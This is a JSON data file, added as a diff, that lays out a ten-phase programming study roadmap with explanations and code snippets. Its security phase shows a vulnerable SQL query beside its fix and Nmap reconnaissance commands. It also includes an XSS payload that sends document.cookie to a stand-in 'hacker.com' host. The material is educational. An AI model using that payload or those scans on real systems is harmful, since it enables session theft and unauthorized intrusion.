@@ -1,0 +1,187 @@
+[
+  {
+    "phaseTitle": "Phase 1: Frontend Web Development",
+    "description": "The foundation of the modern web. Focus on responsive design, DOM manipulation, and browser-based persistence.",
+    "topics": [
+      {
+        "topicTitle": "Modern Layouts with CSS Grid",
+        "text": "Grid is the most powerful layout system available in CSS. It is 2-dimensional, meaning it can handle both columns and rows. Use 'auto-fit' and 'minmax' to create truly responsive grids that don't even need media queries.",
+        "codeSnippet": ".grid-wrapper {\n    display: grid;\n    grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));\n    gap: 2rem;\n}\n\n/* Aligning items inside the grid cell */\n.grid-item {\n    display: flex;\n    align-items: center;\n    justify-content: center;\n}"
+      },
+      {
+        "topicTitle": "Asynchronous JavaScript (Fetch & Promises)",
+        "text": "When talking to APIs (like your JSONBin or Weather API), you must handle the delay. Use 'async/await' for cleaner code that reads like synchronous logic but performs non-blocking operations.",
+        "codeSnippet": "async function getData(url) {\n    try {\n        const response = await fetch(url);\n        if (!response.ok) throw new Error('Network response was not ok');\n        const data = await response.json();\n        return data;\n    } catch (error) {\n        console.error('Fetch error:', error);\n    }\n}"
+      },
+      {
+        "topicTitle": "The DOM & Event Delegation",
+        "text": "Instead of adding an event listener to 100 different buttons, add ONE listener to their parent container. This is called Event Delegation and it is much more memory efficient.",
+        "codeSnippet": "document.getElementById('parent-list').addEventListener('click', (event) => {\n    if (event.target.tagName === 'LI') {\n        console.log('Clicked item text:', event.target.innerText);\n    }\n});"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 2: Python & Data Science",
+    "description": "Moving from syntax to data manipulation. Mastering the 'Big Three' libraries: Pandas, NumPy, and Matplotlib.",
+    "topics": [
+      {
+        "topicTitle": "Pandas: DataFrames & Cleaning",
+        "text": "A DataFrame is essentially an Excel spreadsheet inside Python. You can filter, sort, and clean millions of rows of data with single commands.",
+        "codeSnippet": "import pandas as pd\n\ndf = pd.read_csv('data.csv')\n\n# Cleaning: Fill missing values with the mean\ndf['age'] = df['age'].fillna(df['age'].mean())\n\n# Filtering: Only rows where score > 80\nhigh_scores = df[df['score'] > 80]\n\nprint(high_scores.describe())"
+      },
+      {
+        "topicTitle": "Statistical Calculations (NumPy)",
+        "text": "For your Statistical Dashboard, NumPy is the engine. It performs complex math on entire arrays (vectors) much faster than standard Python loops.",
+        "codeSnippet": "import numpy as np\n\ndata = [10, 20, 30, 40, 50]\n\nmean = np.mean(data)\nstd_dev = np.std(data)\nvariance = np.var(data)\n\n# Skewness requires the scipy library\nfrom scipy.stats import skew\nprint(f\"Skewness: {skew(data)}\")"
+      },
+      {
+        "topicTitle": "Virtual Environments & Pip",
+        "text": "Always isolate your projects. Different projects may require different versions of libraries. Use venv to keep your global Python installation clean.",
+        "codeSnippet": "# Create environment\npython -m venv venv\n\n# Activate (Windows)\n.\\venv\\Scripts\\activate\n\n# Install requirements\npip install pandas matplotlib seaborn"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 3: C++ & Core Logic",
+    "description": "Low-level power. Understanding memory, pointers, and the compilation process for performance-critical apps.",
+    "topics": [
+      {
+        "topicTitle": "Pointers & References",
+        "text": "A pointer stores the memory address of a value. A reference is an alias for an existing variable. Understanding this is key to building the Freserve game engine without crashing the computer.",
+        "codeSnippet": "int health = 100;\nint* ptr = &health; // Pointer to address\nint& ref = health; // Reference to variable\n\n*ptr = 80; // Changing value via pointer\nstd::cout << health; // Outputs 80"
+      },
+      {
+        "topicTitle": "Classes & Header Files",
+        "text": "In C++, we separate the 'blueprint' (Header .h) from the 'execution' (Source .cpp). This speeds up compilation time for large projects.",
+        "codeSnippet": "// Player.h\nclass Player {\npublic:\n    Player(std::string name);\n    void takeDamage(int amount);\nprivate:\n    int health;\n};\n\n// Player.cpp\n#include \"Player.h\"\nvoid Player::takeDamage(int amount) {\n    health -= amount;\n}"
+      },
+      {
+        "topicTitle": "Standard Template Library (STL)",
+        "text": "Don't reinvent the wheel. Use 'std::vector' for dynamic arrays, 'std::map' for key-value pairs, and 'std::stack' for undo/redo logic.",
+        "codeSnippet": "#include <vector>\n#include <algorithm>\n\nstd::vector<int> scores = {90, 70, 85};\nscores.push_back(100);\n\n// Sorting the vector\nstd::sort(scores.begin(), scores.end());"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 4: Deep Dive into Java",
+    "description": "Strict Object-Oriented Programming. Mastering inheritance, polymorphism, and enterprise-grade design patterns.",
+    "topics": [
+      {
+        "topicTitle": "Inheritance & Polymorphism",
+        "text": "This is the 'is-a' relationship. A Warrior 'is-a' Character. Polymorphism allows you to treat a list of different objects (Warriors, Mages) as a single list of Characters and call their specific methods.",
+        "codeSnippet": "public abstract class Character {\n    public abstract void attack();\n}\n\npublic class Warrior extends Character {\n    @Override\n    public void attack() {\n        System.out.println(\"Swings sword!\");\n    }\n}"
+      },
+      {
+        "topicTitle": "Interfaces vs Abstract Classes",
+        "text": "Abstract classes define what a thing IS (base identity). Interfaces define what a thing can DO (behavior). A class can only inherit one abstract class, but it can implement many interfaces.",
+        "codeSnippet": "public interface Healable {\n    void applyHeal(int amount);\n}\n\npublic class Priest extends Character implements Healable {\n    public void applyHeal(int amount) { /* Logic */ }\n}"
+      },
+      {
+        "topicTitle": "Exception Handling",
+        "text": "Don't let your app crash. Use try-catch blocks to handle input errors or file loading issues gracefully. Use 'finally' to close database connections.",
+        "codeSnippet": "try {\n    File myFile = new File(\"save.txt\");\n    Scanner reader = new Scanner(myFile);\n} catch (FileNotFoundException e) {\n    System.out.println(\"Save file missing!\");\n} finally {\n    System.out.println(\"Cleanup code runs here.\");\n}"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 5: Mobile App Dev (Android)",
+    "description": "Building native applications with Java and the Android SDK. Mastering life-cycles and hardware permissions.",
+    "topics": [
+      {
+        "topicTitle": "The Activity Lifecycle",
+        "text": "Android apps don't just 'run'—they transition through states. If you don't handle 'onPause' or 'onSaveInstanceState', your app will lose data whenever the user rotates their phone.",
+        "codeSnippet": "@Override\nprotected void onPause() {\n    super.onPause();\n    // Save uncommitted changes to SharedPreferences or Database\n}\n\n@Override\nprotected void onResume() {\n    super.onResume();\n    // Refresh UI or resume sensors/animations\n}"
+      },
+      {
+        "topicTitle": "Networking with Retrofit",
+        "text": "Don't use raw HttpUrlConnection. Retrofit turns your HTTP API into a Java Interface, making network calls as simple as calling a local method.",
+        "codeSnippet": "public interface WeatherService {\n    @GET(\"weather/{city}\")\n    Call<WeatherResponse> getCityWeather(@Path(\"city\") String city);\n}\n\n// Usage\nRetrofit retrofit = new Retrofit.Builder()\n    .baseUrl(\"https://api.example.com/\")\n    .addConverterFactory(GsonConverterFactory.create())\n    .build();"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 6: Machine Learning (AI)",
+    "description": "Teaching computers to recognize patterns using Python. From Linear Regression to Deep Learning.",
+    "topics": [
+      {
+        "topicTitle": "The ML Workflow",
+        "text": "1. Scrape/Collect Data -> 2. Clean (Pandas) -> 3. Split (Train/Test) -> 4. Train Model -> 5. Evaluate (Accuracy/F1 Score).",
+        "codeSnippet": "from sklearn.model_selection import train_test_split\nfrom sklearn.ensemble import RandomForestClassifier\n\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)\n\nmodel = RandomForestClassifier()\nmodel.fit(X_train, y_train)\n\nprint(f\"Model Accuracy: {model.score(X_test, y_test)}\")"
+      },
+      {
+        "topicTitle": "Neural Networks (TensorFlow/Keras)",
+        "text": "For complex tasks like image recognition in Bandi v2, we use layers of 'neurons'. A Convolutional Neural Network (CNN) is best for spatial data (images).",
+        "codeSnippet": "model = Sequential([\n    Conv2D(32, (3,3), activation='relu', input_shape=(64, 64, 3)),\n    MaxPooling2D(2,2),\n    Flatten(),\n    Dense(128, activation='relu'),\n    Dense(1, activation='sigmoid') # Binary Output\n])"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 7: Game Development (Godot)",
+    "description": "Scene-based game architecture using GDScript. Logic meets physics and visuals.",
+    "topics": [
+      {
+        "topicTitle": "The Scene Tree & Nodes",
+        "text": "In Godot, everything is a Node. A 'Player' scene might consist of a CharacterBody2D (physics), a Sprite2D (visual), and a CollisionShape2D (hitbox).",
+        "codeSnippet": "extends CharacterBody2D\n\nconst SPEED = 300.0\n\nfunc _physics_process(delta):\n    var direction = Input.get_axis(\"ui_left\", \"ui_right\")\n    if direction:\n        velocity.x = direction * SPEED\n    else:\n        velocity.x = move_toward(velocity.x, 0, SPEED)\n\n    move_and_slide()"
+      },
+      {
+        "topicTitle": "Signals: Decoupled Communication",
+        "text": "Avoid 'Spaghetti Code'. Instead of the Player telling the UI to update, the Player 'emits' a signal, and the UI 'listens' for it.",
+        "codeSnippet": "# Player.gd\nsignal health_depleted\n\nfunc die():\n    emit_signal(\"health_depleted\")\n\n# UI.gd\nfunc _ready():\n    player.connect(\"health_depleted\", _on_player_death)"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 8: Full-Stack & Integration",
+    "description": "The 'Glue' of the ecosystem. Building secure APIs that connect Web, Mobile, and Games.",
+    "topics": [
+      {
+        "topicTitle": "JWT Authentication",
+        "text": "JSON Web Tokens allow for stateless authentication. The server signs a token and the client sends it back in the 'Authorization' header for every request.",
+        "codeSnippet": "const jwt = require('jsonwebtoken');\n\n// Generating a token\nconst token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET, { expiresIn: '24h' });\n\n// Verifying middleware\nconst auth = (req, res, next) => {\n    const token = req.header('Authorization').replace('Bearer ', '');\n    const decoded = jwt.verify(token, process.env.JWT_SECRET);\n    req.user = decoded;\n    next();\n};"
+      },
+      {
+        "topicTitle": "CORS (Cross-Origin Resource Sharing)",
+        "text": "By default, your Node.js API will block requests from your GitHub Pages site. You must explicitly allow your domain in the Express middleware.",
+        "codeSnippet": "const cors = require('cors');\n\nconst corsOptions = {\n    origin: 'https://yourname.github.io',\n    optionsSuccessStatus: 200\n};\n\napp.use(cors(corsOptions));"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 9: Ethical Hacking & Security",
+    "description": "Learning to identify and patch vulnerabilities. Shifting the mindset from 'How do I build it?' to 'How can this be broken?'",
+    "topics": [
+      {
+        "topicTitle": "SQL Injection (SQLi) Prevention",
+        "text": "The most common attack on databases. Never concatenate user input directly into SQL strings. Always use Parameterized Queries or an ORM like Mongoose/Sequelize.",
+        "codeSnippet": "// VULNERABLE CODE (DO NOT USE)\nconst query = \"SELECT * FROM users WHERE id = \" + req.body.id;\n\n// SECURE CODE (Parameterized)\nconst query = \"SELECT * FROM users WHERE id = ?\";\ndb.execute(query, [req.body.id]);"
+      },
+      {
+        "topicTitle": "Network Reconnaissance (Nmap)",
+        "text": "Before an attack, a hacker maps the network. Nmap is the industry standard for discovering open ports and identifying the services (and versions) running on a server.",
+        "codeSnippet": "# Basic Service Version Scan\nnmap -sV 192.168.1.1\n\n# Aggressive Scan (OS Detection + Scripts)\nnmap -A target.com\n\n# Scanning for common web vulnerabilities\nnmap --script http-enum target.com"
+      },
+      {
+        "topicTitle": "Cross-Site Scripting (XSS)",
+        "text": "XSS occurs when an application includes untrusted data in a web page without proper validation. Use 'DOMPurify' on the frontend and 'Helmet.js' on the backend to sanitize everything.",
+        "codeSnippet": "\n<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>\n\n// Prevention in Node.js\nconst helmet = require('helmet');\napp.use(helmet());"
+      }
+    ]
+  },
+  {
+    "phaseTitle": "Phase 10: The Ultimate Capstone",
+    "description": "The culmination of 2.5 years. Building a synchronized, multi-platform system that utilizes every skill in the marathon.",
+    "topics": [
+      {
+        "topicTitle": "System Design & Microservices",
+        "text": "In a massive ecosystem, don't build a 'Monolith'. Separate your ML logic (FastAPI), your user management (Node.js), and your game assets (Godot) so they can scale independently.",
+        "codeSnippet": "// Typical Capstone Flow:\n// 1. Android App requests data from Node.js API\n// 2. Node.js API queries MongoDB\n// 3. Node.js API triggers Python ML script for prediction\n// 4. Result is sent back to Android and synced to Web Dashboard"
+      },
+      {
+        "topicTitle": "CI/CD Pipelines (GitHub Actions)",
+        "text": "Automation is the final boss. Set up a workflow so that every time you push code to GitHub, your tests run automatically, and your site redeploys only if the tests pass.",
+        "codeSnippet": "name: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v3\n      - name: Install dependencies\n        run: npm install\n      - name: Run Tests\n        run: npm test"
+      }
+    ]
+  }
+]
